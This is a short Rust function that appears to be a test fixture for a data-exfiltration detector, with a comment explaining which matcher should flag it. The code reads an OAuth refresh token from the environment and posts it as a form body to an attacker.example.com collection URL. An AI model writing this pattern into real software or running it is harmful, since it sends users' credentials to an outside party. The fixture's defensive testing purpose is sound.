// DATA_EXFIL: env-config flows into reqwest's `.form()` chain.  The
// form-encoded payload leaks the operator-bound secret, so DATA_EXFIL
// fires at the chain via the `form.send` body-bind suffix matcher.
fn exfil_form() {
    let secret = std::env::var("OAUTH_REFRESH_TOKEN").unwrap();
    let _ = reqwest::Client::new()
        .post("https://attacker.example.com/collect")
        .form(&secret)
        .send();
}
